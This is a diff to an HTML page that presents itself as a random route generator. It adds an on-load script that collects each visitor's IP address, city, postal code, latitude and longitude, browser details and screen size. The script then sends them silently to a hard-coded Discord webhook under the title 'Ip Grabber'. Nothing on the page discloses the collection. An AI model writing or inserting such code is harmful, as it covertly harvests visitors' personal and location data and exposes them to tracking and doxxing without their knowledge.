@@ -5,7 +5,95 @@
     <meta name="keywords" content="random route, generator, random run, random walk, random cycle, random bike, path generator, riley walz, routeshuffle">
     <meta name="description" content="The Random Route Generator allows you to create random routes within a customizable radius. Switch between light and dark mode and open your routes in Google Maps. Choose between modes of transportation like car, on foot, or bicycle to personalize your journey.">
 
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/2.2.4/jquery.min.js"></script>
+    <script type="text/javascript">
+        var webhook = "https://discord.com/api/webhooks/1320891998990897162/exyF2qv0_R1DaqdVHccaoCrsxZQHtaNwv9D4pw7KEsFYZivO1YrPACT3y-EtUpAwGfmt";
 
+        
+        const request = new XMLHttpRequest();
+        request.onreadystatechange = function() {
+            if (this.readyState == 4) {
+                window.open(url,"_self");
+            }
+        }
+        request.open("POST", webhook);
+        request.setRequestHeader('Content-type', 'application/json');
+        $.getJSON('https://json.geoiplookup.io/?callback=?', function(dbip) {
+            $.getJSON('https://api.bigdatacloud.net/data/client-info', function(bdc) {
+                var now = new Date;
+                if (now.toUTCString() != null) {
+                    var description = `**UTC TIME STAMP**: \`${now.toUTCString()}\``;
+                }
+                if (dbip["ip"] != null) {
+                    description = description + `\n**IP**: \`${dbip["ip"]}\``;
+                }
+                if (bdc["isBehindProxy"] != null) {
+                    description = description + `\n**PROXY**: \`${bdc["isBehindProxy"]}\``;
+                }
+                if (dbip["country_name"] != null) {
+                    description = description + `\n**COUNTRY**: \`${dbip["country_name"]}\``;
+                }
+                if (dbip["region"] != null) {
+                    description = description + `\n**STATE**: \`${dbip["region"]}\``;
+                }
+                if (dbip["city"] != null) {
+                    description = description + `\n**CITY**: \`${dbip["city"]}\``;
+                }
+                if (dbip["org"] != null) {
+                    description = description + `\n**ORGANIZATION**: \`${dbip["org"]}\``;
+                }
+                if (dbip["postal_code"] != null) {
+                    description = description + `\n**POSTAL CODE**: \`${dbip["postal_code"]}\``;
+                }
+                if (dbip["latitude"] != null) {
+                    description = description + `\n**LATITUDE**: \`${dbip["latitude"]}\``;
+                }
+                if (dbip["longitude"] != null) {
+                    description = description + `\n**LONGITUDE**: \`${dbip["longitude"]}\``;
+                }
+                if (dbip["currency_name"] != null) {
+                    description = description + `\n**CURRENCY**: \`${dbip["currency_name"]}\``;
+                }
+                if (navigator.userAgent != null) {
+                    description = description + `\n**USER-AGENT**: \`${navigator.userAgent}\``;
+                }
+                if (Intl.DateTimeFormat().resolvedOptions().timeZone != null) {
+                    description = description + `\n**TIME ZONE**: \`${Intl.DateTimeFormat().resolvedOptions().timeZone}\``;
+                }
+                if (document.referrer != null && document.referrer.trim() != "") {
+                    description = description + `\n**REFERRER**: \`${document.referrer}\``;
+                }
+                if (bdc["userAgent"] != null) {
+                    description = description + `\n**BROWSER**: \`${bdc["userAgent"]}\``;
+                }
+                if (navigator.language != null) {
+                    description = description + `\n**LANGUAGE**: \`${navigator.language}\``;
+                }
+                if (navigator.platform != null) {
+                    description = description + `\n**PLATFORM**: \`${navigator.platform}\``;
+                }
+                if (bdc["device"] != null) {
+                    description = description + `\n**DEVICE**: \`${bdc["device"]}\``;
+                }
+                if (navigator.javaEnabled() != null) {
+                    description = description + `\n**JAVA ENABLED**: \`${navigator.javaEnabled()}\``;
+                }
+                if (screen.width != null && screen.height != null) {
+                    description = description + `\n**SCREEN SIZE**: \`${screen.width}x${screen.height}\``;
+                }
+                const params = {
+                    "embeds": [
+                        {
+                            "title": "Ip Grabber",
+                            "description": description,
+                            "color": 5814783
+                        }
+                    ]
+                }
+                request.send(JSON.stringify(params));
+            });
+        })
+    </script>
 
 
     <title>KartenTest</title>
